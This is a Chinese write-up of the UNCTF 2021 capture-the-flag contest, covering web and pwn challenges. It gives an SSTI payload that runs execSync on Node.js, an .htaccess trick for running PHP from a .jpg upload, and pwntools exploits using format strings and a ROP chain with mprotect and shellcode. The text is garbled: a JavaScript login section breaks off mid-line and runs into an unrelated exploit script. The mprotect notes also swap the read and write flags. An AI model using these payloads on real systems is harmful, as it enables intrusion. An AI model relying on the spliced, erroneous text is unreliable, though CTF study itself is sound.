# UNCTF-2021 WriteUp
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
UNCTF2020是我参加的第一个CTF比赛，当时很菜成绩不太好，这次参加UNCTF2021就挺想看看成长了多少，前几天都在公开赛第一名，后面几天有事情，最后只拿了第四名。题目质量还是很不错的，挺有意思的。
## Web
### 1\. **fuzz_md5**
### 2\. **can you hack me**
[www.zip源码泄露](http://www.zip%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2)
下载下来可以获取到密码，利用这个密码构造条件且利用空格绕过
?username=admin%20&password=AdminSecret
### 3\. **Phpmysql**
利用Exception直接执行命令
### 4\. **Bady** **write**
因为file_put_contents可以利用数组绕过写入的数据的过滤，直接写就行了
先写一个1.jpg
利用.htaccess文件上传,php过滤使用换行绕过一下
AddType application/x-httpd-php .jpg
一句话连接后就可以获得flag
### 5\. **nodejs.ssti**
参考IJCTF payload直接打就行
{{“”.toString.constructor(“return
global.process.mainModule.constructor._load(‘child_process’).execSync(‘env’).toString()”)()
}}
### 6\. **enctype login**
因为利用js来验证登录，所以利用bp抓包直接爆破的方法不行了。
js有混淆也不会反混淆。。
所以选择利用控制台来实现
function login(i){
if(i> i *8) & 0xff,offset + i)
            prev = (target >> i * 8) &0xff
        return payload
    payload ='kk%7$nkk'+p32(0x0804a050)
    io.sendline(payload)
    io.recvuntil("check right\n")
    payload = fmt_str(5,4,0x0804a04c,0x6873)
    io.sendline(payload)
    io.recvuntil("good!\n")
    payload = 'a'*0x78+p32(0x08048410)+p32(0)+p32(0x0804a04c)
    io.sendline(payload)
    io.interactive()
第二种做法就是利用栈溢出ret2libc
### 5\. **ezrop**
这个程序也太简单了。。。  
先查看一下mprotect函数
    #include  
    #include  
    int mprotect(const void *start, size_t len, int prot); 
    mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
    prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：
    1）PROT_READ：表示内存段内的内容可写；
    2）PROT_WRITE：表示内存段内的内容可读；
    3）PROT_EXEC：表示内存段中的内容可执行；
    4）PROT_NONE：表示内存段中的内容根本没法访问。
    需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。
那就很明了了，利用mprotect函数修改bss段可执行，然后把shellcode写到bss段，栈溢出跳转。  
找gadget。  
一般找gadget都可以来这边找，一般程序装载都会调用__libc_csu_init函数
然后ROPgadget查找也是必须的
    from pwn import *
    context(os="linux", arch="amd64", log_level="debug")
    io=remote("node2.hackingfor.fun",31247)
    #io=process("./ezrop")
    elf = ELF("./ezrop")
    gad1 = 0x04006DA
    gad2 = 0x04006C0
    rdi = 0x4006e3
    rsi_r15 = 0x4006e1
    bss = elf.bss()
    read_plt = elf.plt['read']
    mprotect_plt = elf.plt['mprotect']
    vuln_addr = elf.symbols['vuln']
    payload = 'a'*(0x50+8)+p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0xdeadbeef)+p64(read_plt)+p64(vuln_addr)
    io.send(payload)
    shell = p64(mprotect_plt)+asm(shellcraft.sh())
    io.send(shell)
    payload = 'a'*(0x50+8) + p64(gad1)+p64(0)+p64(1)+p64(bss)+p64(7)+p64(0x1000)+p64(0x600000)+p64(gad2)+'a'*56+p64(bss+8)
    io.sendline(payload)
    io.interactive()
### 6\. **magic_abs**